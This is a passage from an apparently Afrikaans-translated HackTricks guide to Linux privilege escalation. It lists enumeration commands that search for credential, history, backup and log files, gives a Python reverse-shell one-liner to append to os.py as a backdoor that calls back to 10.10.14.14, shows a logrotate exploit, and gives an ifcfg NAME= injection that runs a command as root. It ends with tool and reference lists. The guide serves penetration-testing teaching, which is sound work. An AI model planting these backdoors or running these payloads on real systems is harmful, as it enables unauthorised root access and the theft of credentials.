find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Gewysigde lêers in die laaste minute
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB-lêers
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml lêers
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Verborge lêers
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Skripte/Uitvoerbare binêre lêers in PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Web-lêers**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Rugsteunkopieë**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Bekende lêers wat passwords bevat

Lees die kode van [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), dit soek na **verskeie moontlike lêers wat passwords kan bevat**.\
**Nog 'n interessante hulpmiddel** wat jy hiervoor kan gebruik, is: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) — 'n open source-toepassing wat gebruik word om baie passwords wat op 'n plaaslike rekenaar vir Windows, Linux & Mac gestoor is, te herwin.

### Logs

Indien jy logs kan lees, kan jy dalk **interessante/vertroulike inligting daarin vind**. Hoe vreemder die log is, hoe meer interessant sal dit wees (waarskynlik).\
Ook kan sommige **sleg** gekonfigureerde (backdoored?) **audit logs** jou toelaat om **passwords** binne audit logs op te neem soos verduidelik in hierdie artikel: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Om **logs te lees sal die groep** [**adm**](interesting-groups-linux-pe/index.html#adm-group) baie nuttig wees.

### Shell lêers
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Jy moet ook kyk na lêers wat die woord "**password**" in hul **naam** of binne die **inhoud** bevat, en ook kyk vir IPs en e-posadresse in logs, of hash regexps.\
Ek gaan nie hier lys hoe om dit alles te doen nie, maar as jy belangstel kan jy die laaste kontroles sien wat [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) uitvoer.

## Skryfbare lêers

### Python library hijacking

As jy weet vanaf **waar** 'n python-skrip uitgevoer gaan word en jy **kan binne** daardie gids skryf of jy kan **modify python libraries**, kan jy die OS library wysig en dit backdoor (as jy kan skryf waar die python-skrip uitgevoer gaan word, kopieer en plak die os.py library).

To **backdoor the library** just add at the end of the os.py library the following line (change IP and PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate-uitbuiting

'n Kwesbaarheid in `logrotate` stel gebruikers met **skryftoestemmings** op 'n log-lêer of sy ouergidse in staat om moontlik verhoogde voorregte te verkry. Dit is omdat `logrotate`, wat dikwels as **root** loop, gemanipuleer kan word om arbitrêre lêers uit te voer, veral in gidse soos _**/etc/bash_completion.d/**_. Dit is belangrik om toestemmings nie net in _/var/log_ te kontroleer nie, maar ook in enige gids waar logrotasie toegepas word.

> [!TIP]
> Hierdie kwesbaarheid beïnvloed `logrotate` weergawe `3.18.0` en ouer

Meer gedetailleerde inligting oor die kwesbaarheid is op hierdie blad beskikbaar: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Jy kan hierdie kwesbaarheid uitbuit met [**logrotten**](https://github.com/whotwagner/logrotten).

Hierdie kwesbaarheid is baie soortgelyk aan [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** dus wanneer jy vind dat jy logs kan verander, kyk wie daardie logs bestuur en kyk of jy voorregte kan verhoog deur die logs met symlinks te vervang.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Kwesbaarheidsverwysing:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Indien, om watter rede ook al, 'n gebruiker in staat is om **skryf** 'n `ifcf-<whatever>` script na _/etc/sysconfig/network-scripts_ **of** 'n bestaande een te **wysig**, dan is jou **stelsel is pwned**.

Network scripts, _ifcg-eth0_ byvoorbeeld, word vir netwerkverbindinge gebruik. Hulle lyk presies soos .INI-lêers. Hulle word egter \~sourced\~ op Linux deur Network Manager (dispatcher.d).

In my geval word die `NAME=`-toekenning in hierdie netwerkskripte nie korrek hanteer nie. As jy **wit/blank spasie in die naam het die stelsel probeer die gedeelte ná die wit/blank spasie uit te voer**. Dit beteken dat **alles ná die eerste spasie as root uitgevoer word**.

Byvoorbeeld: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Let wel die spasieweg tussen Network en /bin/id_)

### **init, init.d, systemd, en rc.d**

Die gids `/etc/init.d` huisves **skripte** vir System V init (SysVinit), die **klassieke Linux-diensbestuurstelsel**. Dit sluit skripte in om `start`, `stop`, `restart`, en soms `reload` dienste. Hierdie kan direk uitgevoer word of deur simboliese skakels wat in `/etc/rc?.d/` gevind word. ’n Alternatiewe pad in Redhat-stelsels is `/etc/rc.d/init.d`.

Aan die ander kant is `/etc/init` geassosieer met **Upstart**, ’n nuwer **diensbestuur** wat deur Ubuntu bekendgestel is, en wat konfigurasielêers vir diensbestuurtake gebruik. Ten spyte van die oorgang na Upstart, word SysVinit-skripte steeds langs Upstart-konfigurasies gebruik danksy ’n versoenbaarheidslaag in Upstart.

**systemd** tree op as ’n moderne inisialisasie- en diensbestuurder, en bied gevorderde funksies soos on-demand daemon-begin, automount-bestuur, en stelseltoestand-snapshots. Dit orden lêers in `/usr/lib/systemd/` vir verspreidingspakkette en `/etc/systemd/system/` vir administrateur-wysigings, wat stelseladministrasie stroomlyn.

## Ander truuks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks heg gewoonlik ’n syscall om geprivilegieerde kernel-funksionaliteit aan ’n userspace manager bloot te stel. Swakke manager-outentisering (bv. signature checks gebaseer op FD-order of swak wagwoordskemas) kan ’n plaaslike app in staat stel om die manager voor te gee en na root te eskaleer op reeds-geroote toestelle. Leer meer en uitbuitingbesonderhede hier:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Meer hulp

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Verwysings

- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

{{#include ../../banners/hacktricks-training.md}}
